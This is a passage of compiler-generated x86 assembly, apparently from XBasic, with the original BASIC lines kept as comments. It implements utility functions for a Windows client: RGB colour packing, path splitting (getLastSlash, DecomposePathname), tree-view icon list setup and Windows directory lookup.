else.00FD.client:
end.if.00FD.client:
;
; [2431] RETURN r | (g << 8) | (b << 16)
	mov	eax,d[ebp+12]			;;; i665
	shl	eax,8			;;; i835
	mov	ebx,d[ebp+8]			;;; i665
	or	eax,ebx			;;; i763
	mov	ebx,d[ebp+16]			;;; i665
	shl	ebx,16			;;; i835
	or	eax,ebx			;;; i763
	jmp	end.func1F.client			;;; i258
;
; [2433] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.RGB.client:  ;;; Function end label for Assembly Programmers.
end.func1F.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  RGB ()  *****
;  *****
;
; [2435] FUNCTION getLastSlash(str$, stop)
.code
;
#ifdef getLastSlash.str$
#undef getLastSlash.str$
#endif
#define getLastSlash.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef getLastSlash.stop
#undef getLastSlash.stop
#endif
#define getLastSlash.stop ebp+12	; exposes function argument 'stop'
;
align 16
_getLastSlash.client@8:
;  *****
;  *****  FUNCTION  getLastSlash ()  *****
;  *****
func27.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody27.client:
;
; [2436] $PathSlash$   = "\\"
;
; [2439] IF stop < 0 THEN
	mov	eax,d[ebp+12]			;;; i665
	cmp	eax,0			;;; i684a
	jge	>> else.00FE.client			;;; i219
;
; [2440] slash1 = RINSTR(str$, "/")
#ifdef getLastSlash.slash1
#undef getLastSlash.slash1
#endif
#define getLastSlash.slash1 ebp-40	; exposes local variable 'slash1'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.027E.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [2441] slash2 = RINSTR(str$, $PathSlash$)
#ifdef getLastSlash.slash2
#undef getLastSlash.slash2
#endif
#define getLastSlash.slash2 ebp-44	; exposes local variable 'slash2'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.0149.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [2442] ELSE
	jmp	end.if.00FE.client			;;; i107
else.00FE.client:
;
; [2443] slash1 = RINSTR(str$, "/", stop)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.027E.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp+8],eax			;;; i887
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-40],eax			;;; i670
;
; [2444] slash2 = RINSTR(str$, $PathSlash$, stop)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.0149.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp+12]			;;; i665
	mov	d[esp+8],eax			;;; i887
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [2445] END IF
end.if.00FE.client:
;
; [2446] IFZ slash1 THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00FF.client			;;; i195
;
; [2447] RETURN slash2
	mov	eax,d[ebp-44]			;;; i665
	jmp	end.func27.client			;;; i258
;
; [2448] ELSE
	jmp	end.if.00FF.client			;;; i107
else.00FF.client:
;
; [2449] RETURN MAX(slash1, slash2)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_MAX.xlong
	add	esp,64			;;; i600
	jmp	end.func27.client			;;; i258
;
; [2450] END IF
end.if.00FF.client:
;
; [2452] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.getLastSlash.client:  ;;; Function end label for Assembly Programmers.
end.func27.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  getLastSlash ()  *****
;  *****
;
; [2454] FUNCTION DecomposePathname (pathname$, @path$, @parent$, @filename$, @file$, @extent$)
.code
;
#ifdef DecomposePathname.pathname$
#undef DecomposePathname.pathname$
#endif
#define DecomposePathname.pathname$ ebp+8	; exposes function argument 'pathname$'
;
;
#ifdef DecomposePathname.path$
#undef DecomposePathname.path$
#endif
#define DecomposePathname.path$ ebp+12	; exposes function argument 'path$'
;
;
#ifdef DecomposePathname.parent$
#undef DecomposePathname.parent$
#endif
#define DecomposePathname.parent$ ebp+16	; exposes function argument 'parent$'
;
;
#ifdef DecomposePathname.filename$
#undef DecomposePathname.filename$
#endif
#define DecomposePathname.filename$ ebp+20	; exposes function argument 'filename$'
;
;
#ifdef DecomposePathname.file$
#undef DecomposePathname.file$
#endif
#define DecomposePathname.file$ ebp+24	; exposes function argument 'file$'
;
;
#ifdef DecomposePathname.extent$
#undef DecomposePathname.extent$
#endif
#define DecomposePathname.extent$ ebp+28	; exposes function argument 'extent$'
;
align 16
_DecomposePathname.client@24:
;  *****
;  *****  FUNCTION  DecomposePathname ()  *****
;  *****
func26.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func26.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.440:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.440			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody26.client:
;
; [2455] '
;
; [2456] path$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2457] file$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2458] extent$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+28]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2459] parent$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2460] filename$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+20]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2461] name$ = TRIM$ (pathname$)
#ifdef DecomposePathname.name$
#undef DecomposePathname.name$
#endif
#define DecomposePathname.name$ ebp-40	; exposes local variable 'name$'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2462] dot = RINSTR (name$, ".")
#ifdef DecomposePathname.dot
#undef DecomposePathname.dot
#endif
#define DecomposePathname.dot ebp-44	; exposes local variable 'dot'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.0592.client			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-44],eax			;;; i670
;
; [2463] slash = getLastSlash(name$, -1)
#ifdef DecomposePathname.slash
#undef DecomposePathname.slash
#endif
#define DecomposePathname.slash ebp-48	; exposes local variable 'slash'
;
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk26.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	func27.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[ebp-48],eax			;;; i670
;
; [2465] IF slash THEN preslash = getLastSlash(name$, slash-1)
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0100.client			;;; i221
#ifdef DecomposePathname.preslash
#undef DecomposePathname.preslash
#endif
#define DecomposePathname.preslash ebp-60	; exposes local variable 'preslash'
;
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,1			;;; i791
	push	eax			;;; i667a
	push	[ebp-56]			;;; i674a
	call	func27.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[ebp-60],eax			;;; i670
else.0100.client:
end.if.0100.client:
;
; [2466] IF (dot < slash) THEN dot = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jge	>> else.0101.client			;;; i219
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
else.0101.client:
end.if.0101.client:
;
; [2467] '
;
; [2468] filename$ = MID$ (name$, slash+1)' filename = "name.ext"
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],2147483647			;;; i579
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+20]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2469] IFZ dot THEN
	mov	eax,d[ebp-44]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.0102.client			;;; i195
;
; [2470] file$ = filename$' file = filename (filename has no extent)
	mov	eax,[ebp+20]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2471] ELSE
	jmp	end.if.0102.client			;;; i107
else.0102.client:
;
; [2472] file$ = MID$ (name$, slash+1, dot-slash-1)' file = "name" (without extent)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	sub	eax,1			;;; i791
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+24]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2473] extent$ = MID$ (name$, dot)' extent = ".ext"
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],2147483647			;;; i579
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+28]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2474] END IF
end.if.0102.client:
;
; [2475] '
;
; [2476] IF slash THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0103.client			;;; i221
;
; [2477] path$ = LEFT$ (name$, slash-1)' path = full pathname to left of "/file.ext"
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2478] IF preslash THEN
	mov	eax,d[ebp-60]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0104.client			;;; i221
;
; [2479] parent$ = MID$ (name$, preslash+1, slash-preslash-1)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-60]			;;; i665
	add	eax,1			;;; i775
	mov	d[esp+4],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-60]			;;; i665
	sub	eax,ebx			;;; i791
	sub	eax,1			;;; i791
	mov	d[esp+8],eax			;;; i887
	call	%_mid.d.v			;;; i580
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2480] ELSE
	jmp	end.if.0104.client			;;; i107
else.0104.client:
;
; [2481] parent$ = LEFT$ (name$, slash-1)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+16]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2482] END IF
end.if.0104.client:
;
; [2483] END IF
else.0103.client:
end.if.0103.client:
;
; [2485] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.DecomposePathname.client:  ;;; Function end label for Assembly Programmers.
end.func26.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func26.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	24			;;; i111a
free.func26.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  DecomposePathname ()  *****
;  *****
;
; [2487] FUNCTION  InitTreeViewImageList (hTreeView)
.code
;
#ifdef InitTreeViewImageList.hTreeView
#undef InitTreeViewImageList.hTreeView
#endif
#define InitTreeViewImageList.hTreeView ebp+8	; exposes function argument 'hTreeView'
;
align 16
_InitTreeViewImageList.client@4:
;  *****
;  *****  FUNCTION  InitTreeViewImageList ()  *****
;  *****
func24.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func24.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.443:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.443			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,128			;;; i114a
;
funcBody24.client:
;
; [2489] ' create a masked image list for 4 small folder icons
;
; [2490] himl = ImageList_Create (16, 16, $$ILC_COLOR8 | $$ILC_MASK, 4, 0)
#ifdef InitTreeViewImageList.himl
#undef InitTreeViewImageList.himl
#endif
#define InitTreeViewImageList.himl ebp-40	; exposes local variable 'himl'
;
;
; [0] EXTERNAL FUNCTION  ImageList_Create (cx, cy, flags, cInitial, cGrow)
	mov	eax,8			;;; i659
	or	eax,1			;;; i763
; .xstk24.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	0			;;; i656a
	push	4			;;; i656a
	push	[ebp-48]			;;; i674a
	push	16			;;; i656a
	push	16			;;; i656a
	call	_ImageList_Create@20			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [2491] dir$ = GetWindowsDir()
#ifdef InitTreeViewImageList.dir$
#undef InitTreeViewImageList.dir$
#endif
#define InitTreeViewImageList.dir$ ebp-52	; exposes local variable 'dir$'
;
	call	func25.client			;;; i619
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2492] hSysImageList = GetSysFolderIcon (dir$, @hIconFolder, @iIconFolder, @hIconFolderOpen, @iIconFolderOpen)
#ifdef InitTreeViewImageList.hSysImageList
#undef InitTreeViewImageList.hSysImageList
#endif
#define InitTreeViewImageList.hSysImageList ebp-56	; exposes local variable 'hSysImageList'
;
	mov	eax,d[ebp-52]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-48],eax			;;; i670
#ifdef InitTreeViewImageList.hIconFolder
#undef InitTreeViewImageList.hIconFolder
#endif
#define InitTreeViewImageList.hIconFolder ebp-60	; exposes local variable 'hIconFolder'
;
#ifdef InitTreeViewImageList.iIconFolder
#undef InitTreeViewImageList.iIconFolder
#endif
#define InitTreeViewImageList.iIconFolder ebp-64	; exposes local variable 'iIconFolder'
;
#ifdef InitTreeViewImageList.hIconFolderOpen
#undef InitTreeViewImageList.hIconFolderOpen
#endif
#define InitTreeViewImageList.hIconFolderOpen ebp-68	; exposes local variable 'hIconFolderOpen'
;
#ifdef InitTreeViewImageList.iIconFolderOpen
#undef InitTreeViewImageList.iIconFolderOpen
#endif
#define InitTreeViewImageList.iIconFolderOpen ebp-72	; exposes local variable 'iIconFolderOpen'
;
	push	[ebp-72]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	func23.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	ebx,d[esp+8]			;;; i877b
	mov	edi,d[esp+12]			;;; i877c
	mov	esi,d[esp+16]			;;; i877d
	mov	d[ebp-60],ecx			;;; i670
	mov	d[ebp-64],ebx			;;; i670
	mov	d[ebp-68],edi			;;; i670
	mov	d[ebp-72],esi			;;; i670
	add	esp,20			;;; i633
	mov	d[ebp-56],eax			;;; i670
;
; [2494] ' get the C: drive icons
;
; [2495] sil = GetSysFolderIcon (LEFT$(dir$,3), @hIconCDrive, @iIconCDrive, @hIconCDriveOpen, @iIconCDriveOpen)
#ifdef InitTreeViewImageList.sil
#undef InitTreeViewImageList.sil
#endif
#define InitTreeViewImageList.sil ebp-76	; exposes local variable 'sil'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp-52]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],3
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	mov	[ebp-48],eax			;;; i670
#ifdef InitTreeViewImageList.hIconCDrive
#undef InitTreeViewImageList.hIconCDrive
#endif
#define InitTreeViewImageList.hIconCDrive ebp-80	; exposes local variable 'hIconCDrive'
;
#ifdef InitTreeViewImageList.iIconCDrive
#undef InitTreeViewImageList.iIconCDrive
#endif
#define InitTreeViewImageList.iIconCDrive ebp-84	; exposes local variable 'iIconCDrive'
;
#ifdef InitTreeViewImageList.hIconCDriveOpen
#undef InitTreeViewImageList.hIconCDriveOpen
#endif
#define InitTreeViewImageList.hIconCDriveOpen ebp-88	; exposes local variable 'hIconCDriveOpen'
;
#ifdef InitTreeViewImageList.iIconCDriveOpen
#undef InitTreeViewImageList.iIconCDriveOpen
#endif
#define InitTreeViewImageList.iIconCDriveOpen ebp-92	; exposes local variable 'iIconCDriveOpen'
;
	push	[ebp-92]			;;; i674a
	push	[ebp-88]			;;; i674a
	push	[ebp-84]			;;; i674a
	push	[ebp-80]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	func23.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	ebx,d[esp+8]			;;; i877b
	mov	edi,d[esp+12]			;;; i877c
	mov	esi,d[esp+16]			;;; i877d
	mov	d[ebp-80],ecx			;;; i670
	mov	d[ebp-84],ebx			;;; i670
	mov	d[ebp-88],edi			;;; i670
	mov	d[ebp-92],esi			;;; i670
	add	esp,20			;;; i633
	mov	d[ebp-76],eax			;;; i670
;
; [2496] '	PRINT hSysImageList, hIconCDrive, iIconCDrive, hIconCDriveOpen, iIconCDriveOpen
;
; [2498] ' add the icons to the imagelist
;
; [2499] ret1 = ImageList_ReplaceIcon (himl, -1, hIconFolder)' use index of -1 to add icons
#ifdef InitTreeViewImageList.ret1
#undef InitTreeViewImageList.ret1
#endif
#define InitTreeViewImageList.ret1 ebp-96	; exposes local variable 'ret1'
;
;
; [0] EXTERNAL FUNCTION  ImageList_ReplaceIcon (himl, i, hicon)
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-48],eax			;;; i670
	push	[ebp-60]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	_ImageList_ReplaceIcon@12			;;; i619
	mov	d[ebp-96],eax			;;; i670
;
; [2500] ret2 = ImageList_ReplaceIcon (himl, -1, hIconFolderOpen)
#ifdef InitTreeViewImageList.ret2
#undef InitTreeViewImageList.ret2
#endif
#define InitTreeViewImageList.ret2 ebp-100	; exposes local variable 'ret2'
;
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-48],eax			;;; i670
	push	[ebp-68]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	_ImageList_ReplaceIcon@12			;;; i619
	mov	d[ebp-100],eax			;;; i670
;
; [2501] ret3 = ImageList_ReplaceIcon (himl, -1, hIconCDrive)
#ifdef InitTreeViewImageList.ret3
#undef InitTreeViewImageList.ret3
#endif
#define InitTreeViewImageList.ret3 ebp-104	; exposes local variable 'ret3'
;
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-48],eax			;;; i670
	push	[ebp-80]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	_ImageList_ReplaceIcon@12			;;; i619
	mov	d[ebp-104],eax			;;; i670
;
; [2502] ret4 = ImageList_ReplaceIcon (himl, -1, hIconCDriveOpen)
#ifdef InitTreeViewImageList.ret4
#undef InitTreeViewImageList.ret4
#endif
#define InitTreeViewImageList.ret4 ebp-108	; exposes local variable 'ret4'
;
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-48],eax			;;; i670
	push	[ebp-88]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	_ImageList_ReplaceIcon@12			;;; i619
	mov	d[ebp-108],eax			;;; i670
;
; [2503] ret5 = ImageList_ReplaceIcon (himl, -1, 0)
#ifdef InitTreeViewImageList.ret5
#undef InitTreeViewImageList.ret5
#endif
#define InitTreeViewImageList.ret5 ebp-112	; exposes local variable 'ret5'
;
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-48],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp-40]			;;; i674a
	call	_ImageList_ReplaceIcon@12			;;; i619
	mov	d[ebp-112],eax			;;; i670
;
; [2505] '	PRINT "ImageList_ReplaceIcon rets:"; ret1, ret2, ret3, ret4
;
; [2507] ' associate the imagelist with the treeview control
;
; [2508] SendMessageA (hTreeView, $$TVM_SETIMAGELIST, $$TVSIL_NORMAL, himl)
	push	[ebp-40]			;;; i674a
	push	0			;;; i656a
	push	4361			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [2510] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.InitTreeViewImageList.client:  ;;; Function end label for Assembly Programmers.
end.func24.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func24.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func24.client:
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  InitTreeViewImageList ()  *****
;  *****
;
; [2512] FUNCTION STRING GetWindowsDir()
.code
align 16
_GetWindowsDir.client@0:
;  *****
;  *****  FUNCTION  GetWindowsDir ()  *****
;  *****
func25.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func25.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody25.client:
;
; [2513] STRING buffer
#ifdef GetWindowsDir.buffer
#undef GetWindowsDir.buffer
#endif
#define GetWindowsDir.buffer ebp-40	; exposes local variable 'buffer'
;
;
; [2515] buffer = SPACE$(256)
	sub	esp,64			;;; i487
	mov	d[esp],256
	call	%_space.d			;;; i573
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2516] ret = GetWindowsDirectoryA (&buffer, 255)
#ifdef GetWindowsDir.ret
#undef GetWindowsDir.ret
#endif
#define GetWindowsDir.ret ebp-44	; exposes local variable 'ret'
;
;
; [0] EXTERNAL FUNCTION GetWindowsDirectoryA (lpBuffer, nSize)
	mov	eax,d[ebp-40]			;;; i642
; .xstk25.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	255			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_GetWindowsDirectoryA@8			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [2517] RETURN LEFT$(buffer, ret)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-44]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	jmp	end.func25.client			;;; i258
;
; [2518] END FUNCTION
